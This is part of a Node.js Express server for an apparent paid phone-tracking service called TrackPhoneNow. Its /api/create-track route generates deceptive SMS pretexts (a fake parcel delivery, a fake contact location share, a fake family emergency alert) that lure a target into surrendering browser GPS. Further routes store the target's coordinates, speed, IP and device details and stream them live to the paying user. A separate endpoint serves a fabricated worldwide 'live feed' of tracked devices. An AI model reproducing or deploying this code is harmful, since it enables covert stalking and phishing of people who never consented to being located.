      sourceLabel: `Campaign (${utmSource.trim()})`,
      sourceDomain: utmSource.trim()
    };
  }

  if (!referrer || !referrer.trim()) {
    return {
      source: 'direct',
      sourceLabel: 'Direct / Bookmark',
      sourceDomain: 'direct'
    };
  }

  try {
    let cleanRef = referrer.trim();
    if (!cleanRef.startsWith('http://') && !cleanRef.startsWith('https://')) {
      cleanRef = 'https://' + cleanRef;
    }
    const url = new URL(cleanRef);
    const host = url.hostname.toLowerCase();

    // AI Search Engines & LLMs
    if (host.includes('chatgpt.com') || host.includes('chat.openai.com')) {
      return { source: 'chatgpt', sourceLabel: 'ChatGPT AI', sourceDomain: 'chatgpt.com' };
    }
    if (host.includes('perplexity.ai')) {
      return { source: 'perplexity', sourceLabel: 'Perplexity AI', sourceDomain: 'perplexity.ai' };
    }
    if (host.includes('claude.ai')) {
      return { source: 'claude', sourceLabel: 'Claude AI', sourceDomain: 'claude.ai' };
    }
    if (host.includes('copilot.microsoft.com') || (host.includes('bing.com') && url.pathname.includes('/chat'))) {
      return { source: 'copilot', sourceLabel: 'Microsoft Copilot', sourceDomain: 'copilot.microsoft.com' };
    }
    if (host.includes('gemini.google.com')) {
      return { source: 'gemini', sourceLabel: 'Google Gemini AI', sourceDomain: 'gemini.google.com' };
    }

    // Traditional Search Engines
    if (host.includes('google.')) {
      return { source: 'google', sourceLabel: 'Google Search', sourceDomain: 'google.com' };
    }
    if (host.includes('bing.com')) {
      return { source: 'bing', sourceLabel: 'Bing Search', sourceDomain: 'bing.com' };
    }
    if (host.includes('duckduckgo.com')) {
      return { source: 'duckduckgo', sourceLabel: 'DuckDuckGo', sourceDomain: 'duckduckgo.com' };
    }
    if (host.includes('yahoo.')) {
      return { source: 'yahoo', sourceLabel: 'Yahoo Search', sourceDomain: 'yahoo.com' };
    }
    if (host.includes('yandex.')) {
      return { source: 'yandex', sourceLabel: 'Yandex Search', sourceDomain: 'yandex.com' };
    }
    if (host.includes('ecosia.org')) {
      return { source: 'ecosia', sourceLabel: 'Ecosia Search', sourceDomain: 'ecosia.org' };
    }

    // Social Platforms
    if (host.includes('t.co') || host.includes('twitter.com') || host.includes('x.com')) {
      return { source: 'twitter', sourceLabel: 'X (Twitter)', sourceDomain: 'x.com' };
    }
    if (host.includes('facebook.com') || host.includes('fb.com')) {
      return { source: 'facebook', sourceLabel: 'Facebook', sourceDomain: 'facebook.com' };
    }
    if (host.includes('instagram.com')) {
      return { source: 'instagram', sourceLabel: 'Instagram', sourceDomain: 'instagram.com' };
    }
    if (host.includes('tiktok.com')) {
      return { source: 'tiktok', sourceLabel: 'TikTok', sourceDomain: 'tiktok.com' };
    }
    if (host.includes('reddit.com')) {
      return { source: 'reddit', sourceLabel: 'Reddit', sourceDomain: 'reddit.com' };
    }
    if (host.includes('youtube.com')) {
      return { source: 'youtube', sourceLabel: 'YouTube', sourceDomain: 'youtube.com' };
    }
    if (host.includes('linkedin.com')) {
      return { source: 'linkedin', sourceLabel: 'LinkedIn', sourceDomain: 'linkedin.com' };
    }

    // Internal navigation
    if (host.includes('trackphonenow.com') || host === 'localhost' || host === '127.0.0.1') {
      return { source: 'internal', sourceLabel: 'Internal Navigation', sourceDomain: host };
    }

    const cleanHost = host.replace(/^www\./, '');
    return { source: 'referral', sourceLabel: `Referral (${cleanHost})`, sourceDomain: cleanHost };
  } catch (e) {
    return { source: 'direct', sourceLabel: 'Direct / Unknown', sourceDomain: 'direct' };
  }
}

function parseDevice(ua, screenWidth) {
  let deviceType = 'desktop';
  if (screenWidth && screenWidth < 768) {
    deviceType = 'mobile';
  } else if (screenWidth && screenWidth <= 1024) {
    deviceType = 'tablet';
  } else if (/iPad|Tablet/i.test(ua)) {
    deviceType = 'tablet';
  } else if (/Mobile|Android|iPhone|iPod/i.test(ua)) {
    deviceType = 'mobile';
  }

  let browser = 'Unknown';
  if (/Edg/i.test(ua)) browser = 'Edge';
  else if (/Chrome/i.test(ua)) browser = 'Chrome';
  else if (/Safari/i.test(ua)) browser = 'Safari';
  else if (/Firefox/i.test(ua)) browser = 'Firefox';
  else if (/Opera|OPR/i.test(ua)) browser = 'Opera';

  let os = 'Unknown';
  if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
  else if (/Android/i.test(ua)) os = 'Android';
  else if (/Windows/i.test(ua)) os = 'Windows';
  else if (/Macintosh|Mac OS/i.test(ua)) os = 'macOS';
  else if (/Linux/i.test(ua)) os = 'Linux';

  return { deviceType, browser, os };
}

app.post('/api/track-visitor', async (req, res) => {
  try {
    const { sessionId, referrer, landingPage, screenWidth, utmSource, utmMedium, utmCampaign } = req.body || {};
    const ua = req.headers['user-agent'] || '';

    // Filter automated search crawler bots
    if (/bot|crawler|spider|crawling|slurp|duckduckbot|baiduspider|yandexbot/i.test(ua)) {
      return res.json({ success: true, bot: true });
    }

    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;

    const attribution = parseVisitorAttribution(referrer, utmSource);
    if (attribution.source === 'internal') {
      return res.json({ success: true, internal: true });
    }

    const device = parseDevice(ua, screenWidth);

    // Geo resolution
    let country = req.headers['cf-ipcountry'] || '';
    let city = req.headers['cf-ipcity'] || '';
    let countryCode = country ? country.toUpperCase() : '';

    if (!countryCode && ip && ip !== '127.0.0.1' && ip !== '::1') {
      if (ipGeoCache.has(ip)) {
        const cached = ipGeoCache.get(ip);
        country = cached.country;
        city = cached.city;
        countryCode = cached.countryCode;
      }
    }

    const visitorRecord = Store.recordVisitor({
      sessionId,
      ip: ip || 'Unknown',
      source: attribution.source,
      sourceLabel: attribution.sourceLabel,
      sourceDomain: attribution.sourceDomain,
      referrerUrl: referrer || null,
      landingPage: landingPage || '/',
      country: country || 'Detected Visitor',
      countryCode: countryCode || 'UN',
      city: city || 'City Area',
      deviceType: device.deviceType,
      browser: device.browser,
      os: device.os,
      utmSource,
      utmMedium,
      utmCampaign
    });

    res.json({ success: true, visitor: visitorRecord });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

// Admin Traffic Stats API
app.get('/api/admin/traffic-stats', requireAdmin, (req, res) => {
  try {
    const stats = Store.getTrafficStats(req.query.period || '7d');
    res.json({ success: true, stats });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});


// ================= GEOLOCATION & TRACKING APIS =================

// 1. API: Lookup phone metadata
app.post('/api/lookup', (req, res) => {
  const { phone } = req.body;
  if (!phone) {
    return res.status(400).json({ error: 'Phone number is required' });
  }
  const info = lookupPhoneMetadata(phone);
  res.json({ success: true, data: info });
});

// 1.1 API: Auto-detect visitor's exact city, country & lat/lon by IP
app.get('/api/geo-ip', async (req, res) => {
  try {
    const queryIp = req.query.ip;
    const forwarded = req.headers['x-forwarded-for'];
    const clientIp = queryIp || (forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress);

    // Cloudflare Headers (Available when behind Cloudflare)
    const cfCountry = req.headers['cf-ipcountry'];
    const cfCity = req.headers['cf-ipcity'];
    const cfLat = req.headers['cf-iplatitude'];
    const cfLong = req.headers['cf-iplongitude'];

    // Try ip-api.com for rich real-time city, lat, lon & ISP
    let ipLookupUrl = 'http://ip-api.com/json/';
    if (clientIp && clientIp !== '127.0.0.1' && clientIp !== '::1' && !clientIp.startsWith('192.168.') && !clientIp.startsWith('10.')) {
      ipLookupUrl = `http://ip-api.com/json/${clientIp}`;
    }

    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 2500);
      const ipRes = await fetch(ipLookupUrl, { signal: controller.signal });
      clearTimeout(timeoutId);
      const geo = await ipRes.json();

      if (geo && geo.status === 'success') {
        const cCode = (geo.countryCode || cfCountry || 'US').toUpperCase();

        return res.json({
          success: true,
          ip: geo.query,
          country: geo.country,
          countryCode: cCode,
          regionName: geo.regionName,
          city: geo.city || cfCity || 'City Center',
          lat: geo.lat || (cfLat ? parseFloat(cfLat) : 33.5731),
          lng: geo.lon || (cfLong ? parseFloat(cfLong) : -7.5898),
          isp: geo.isp || geo.org || 'Broadband ISP',
          lang: 'en'
        });
      }
    } catch (apiErr) {}

    // Fallback if ip-api rate-limited or local dev
    if (cfCountry && cfCountry !== 'XX' && cfCountry !== 'T1') {
      const cCode = cfCountry.toUpperCase();
      return res.json({
        success: true,
        countryCode: cCode,
        city: cfCity || 'Metropolitan Area',
        lat: cfLat ? parseFloat(cfLat) : 33.5731,
        lng: cfLong ? parseFloat(cfLong) : -7.5898,
        lang: 'en'
      });
    }

    // Default Casablanca if local dev
    res.json({
      success: true,
      country: 'Morocco',
      countryCode: 'MA',
      city: 'Casablanca',
      lat: 33.5898,
      lng: -7.6325,
      isp: 'Maroc Telecom / Orange',
      lang: 'en'
    });
  } catch (err) {
    res.json({
      success: false,
      countryCode: 'MA',
      city: 'Casablanca',
      lat: 33.5898,
      lng: -7.6325,
      lang: 'en'
    });
  }
});

// 2. API: Create a new tracking session
app.post('/api/create-track', authMiddleware, (req, res) => {
  const { phone, pretextType = 'delivery', customMessage = '' } = req.body;
  if (!phone) {
    return res.status(400).json({ error: 'Phone number is required' });
  }

  // Enforce Upgrade Lock: User must be authenticated and have an active plan
  const user = req.user;
  if (!user) {
    return res.status(401).json({
      success: false,
      error: 'Authentication Required: Please create an account or sign in to track numbers.',
      requiresAuth: true
    });
  }
  if (user.planStatus !== 'active' || user.plan === 'free') {
    return res.status(403).json({
      success: false,
      error: 'Upgrade Required: You must activate an Express or Pro Pass before tracking phone numbers.',
      requiresUpgrade: true
    });
  }

  const sessionId = uuidv4();
  const phoneInfo = lookupPhoneMetadata(phone);

  const pretexts = {
    delivery: {
      title: 'Express Delivery - Real-time Package Tracking',
      company: 'FastTrack Global Express',
      smsBody: `[Notice] Package #TRK-${Math.floor(100000 + Math.random() * 899999)} is out for delivery. Confirm your exact drop-off coordinates:`,
      icon: '📦'
    },
    friend: {
      title: 'Live Location Sharing Request',
      company: 'FindContact Live',
      smsBody: `A verified contact has shared their location with you and requested yours to meet up:`,
      icon: '📍'
    },
    emergency: {
      title: 'Family & Emergency Safety Alert',
      company: 'SafeGuard Global Network',
      smsBody: `[Urgent] A safety check-in has been requested by a family member. Please tap to verify:`,
      icon: '🛡️'
    },
    custom: {
      title: 'Secure Device Location Verification',
      company: 'DeviceVerify',
      smsBody: customMessage || 'Please verify your location on the map:',
      icon: '🛰️'
    }
  };

  const selectedPretext = pretexts[pretextType] || pretexts.delivery;

  const sessionData = {
    id: sessionId,
    userId: req.user.id,
    phone,
    phoneInfo,
    pretext: selectedPretext,
    status: 'ACTIVE_WAITING',
    createdAt: new Date().toISOString(),
    linkClicks: 0,
    targetLocation: null,
    targetDeviceInfo: null,
    history: [
      { timestamp: new Date().toISOString(), event: 'Tracking link generated & ready for GSM dispatch' }
    ]
  };

  sessions.set(sessionId, sessionData);
  Store.saveSession(sessionData);

  const protocol = req.protocol;
  const host = req.get('host');
  const trackingUrl = `${protocol}://${host}/track.html?id=${sessionId}`;

  res.json({
    success: true,
    sessionId,
    trackingUrl,
    session: sessionData
  });
});

// 3. API: Get Session Details
app.get('/api/session/:id', (req, res) => {
  let session = sessions.get(req.params.id);
  if (!session) {
    session = Store.getSession(req.params.id);
    if (session) sessions.set(session.id, session);
  }
  if (!session) {
    return res.status(404).json({ error: 'Session not found' });
  }
  res.json({ success: true, session });
});

// 4. API: List all active sessions for current user's dashboard
app.get('/api/sessions', authMiddleware, (req, res) => {
  const userId = req.user ? req.user.id : null;
  const userSessions = Store.getUserSessions(userId);
  res.json({ success: true, sessions: userSessions });
});

// 4.1 Delete a session from history
app.delete('/api/session/:id', authMiddleware, (req, res) => {
  const userId = req.user ? req.user.id : null;
  const success = Store.deleteSession(req.params.id, userId);
  sessions.delete(req.params.id);
  res.json({ success, message: success ? 'Target removed from console.' : 'Could not delete.' });
});

// 5. API: Target Page opened event
app.post('/api/track-visit/:id', (req, res) => {
  let session = sessions.get(req.params.id) || Store.getSession(req.params.id);
  if (!session) {
    return res.status(404).json({ error: 'Session not found' });
  }

  session.linkClicks = (session.linkClicks || 0) + 1;
  if (session.status === 'ACTIVE_WAITING') {
    session.status = 'LINK_OPENED';
    session.history.push({
      timestamp: new Date().toISOString(),
      event: 'Target clicked the SMS link and opened the verification page'
    });
    notifySseClients(session.id, { type: 'LINK_OPENED', session });
  }

  sessions.set(session.id, session);
  Store.saveSession(session);
  res.json({ success: true, session });
});

// 6. API: Report Real GPS / Device Location from Target device
app.post('/api/report-location/:id', (req, res) => {
  let session = sessions.get(req.params.id) || Store.getSession(req.params.id);
  if (!session) {
    return res.status(404).json({ error: 'Session not found' });
  }

  const { latitude, longitude, accuracy, altitude, speed, heading, platform, userAgent, battery } = req.body;

  const latNum = parseFloat(latitude);
  const lngNum = parseFloat(longitude);

  if (!isNaN(latNum) && !isNaN(lngNum)) {
    session.status = 'LOCATED';
    session.targetLocation = {
      latitude: latNum,
      longitude: lngNum,
      accuracy: accuracy && !isNaN(parseFloat(accuracy)) ? parseFloat(accuracy) : 5.0,
      altitude: altitude && !isNaN(parseFloat(altitude)) ? parseFloat(altitude) : null,
      speed: speed && !isNaN(parseFloat(speed)) ? parseFloat(speed) : 0,
      heading: heading && !isNaN(parseFloat(heading)) ? parseFloat(heading) : 0,
      timestamp: new Date().toISOString()
    };
    session.targetDeviceInfo = {
      platform: platform || 'Mobile Handset',
      userAgent: userAgent || req.get('user-agent'),
      ip: req.ip || req.headers['x-forwarded-for'] || '127.0.0.1',
      battery: battery || '92%'
    };

    session.history.push({
      timestamp: new Date().toISOString(),
      event: `GPS Location locked successfully (Lat: ${parseFloat(latitude).toFixed(5)}, Lng: ${parseFloat(longitude).toFixed(5)}, Acc: ±${accuracy ? Math.round(accuracy) : 5}m)`
    });

    sessions.set(session.id, session);
    Store.saveSession(session);

    notifySseClients(session.id, { type: 'LOCATED', session });
    return res.json({ success: true, message: 'Location recorded successfully' });
  } else {
    session.status = 'DENIED';
    session.history.push({
      timestamp: new Date().toISOString(),
      event: 'Target denied browser geolocation permission'
    });
    sessions.set(session.id, session);
    Store.saveSession(session);

    notifySseClients(session.id, { type: 'DENIED', session });
    return res.status(400).json({ error: 'Coordinates missing or permission denied' });
  }
});

// 7. API: SSE (Server-Sent Events) for real-time live map & status updates
app.get('/api/stream/:id', (req, res) => {
  const sessionId = req.params.id;
  let session = sessions.get(sessionId) || Store.getSession(sessionId);

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  if (!sseClients.has(sessionId)) {
    sseClients.set(sessionId, new Set());
  }
  sseClients.get(sessionId).add(res);

  res.write(`data: ${JSON.stringify({ type: 'CONNECTED', session })}\n\n`);

  req.on('close', () => {
    if (sseClients.has(sessionId)) {
      sseClients.get(sessionId).delete(res);
      if (sseClients.get(sessionId).size === 0) {
        sseClients.delete(sessionId);
      }
    }
  });
});

function notifySseClients(sessionId, payload) {
  if (sseClients.has(sessionId)) {
    const clients = sseClients.get(sessionId);
    const dataString = `data: ${JSON.stringify(payload)}\n\n`;
    clients.forEach((client) => {
      try {
        client.write(dataString);
      } catch (err) {
        clients.delete(client);
      }
    });
  }
}

// Global Feed: Realistic live stream of tracked devices worldwide
app.get('/api/live-feed', (req, res) => {
  const sampleFeeds = [
    { country: 'Morocco 🇲🇦', city: 'Casablanca', carrier: 'Maroc Telecom', time: 'Just now', accuracy: '± 4m' },
    { country: 'France 🇫🇷', city: 'Paris', carrier: 'Orange FR', time: '8s ago', accuracy: '± 3m' },
    { country: 'USA 🇺🇸', city: 'Los Angeles', carrier: 'Verizon', time: '14s ago', accuracy: '± 5m' },
    { country: 'Spain 🇪🇸', city: 'Madrid', carrier: 'Movistar', time: '22s ago', accuracy: '± 2m' },
    { country: 'Morocco 🇲🇦', city: 'Marrakech', carrier: 'Inwi', time: '35s ago', accuracy: '± 6m' },
    { country: 'UAE 🇦🇪', city: 'Dubai', carrier: 'Etisalat', time: '41s ago', accuracy: '± 4m' },
    { country: 'UK 🇬🇧', city: 'London', carrier: 'EE', time: '55s ago', accuracy: '± 3m' }
  ];
  res.json({ success: true, feed: sampleFeeds });
});

app.listen(PORT, () => {
  console.log(`====================================================`);
  console.log(`🚀 TrackPhoneNow PLATFORM RUNNING AT: http://localhost:${PORT}`);
  console.log(`📡 Landing Page:            http://localhost:${PORT}/`);
  console.log(`🔐 Inscription / Connexion: http://localhost:${PORT}/auth.html`);
  console.log(`📊 Client Pro Dashboard:    http://localhost:${PORT}/dashboard.html`);
  console.log(`====================================================`);

  // 24/7 Render Anti-Sleep Keep-Alive Engine
  // Automatically pings the service every 8 minutes to guarantee 0ms cold starts for Googlebot & visitors
  const KEEP_ALIVE_URL = process.env.RENDER_EXTERNAL_URL || 'https://www.trackphonenow.com';
  setInterval(async () => {
    try {
      await fetch(`${KEEP_ALIVE_URL}/api/geo-ip`);
    } catch (e) {}
  }, 8 * 60 * 1000);
});
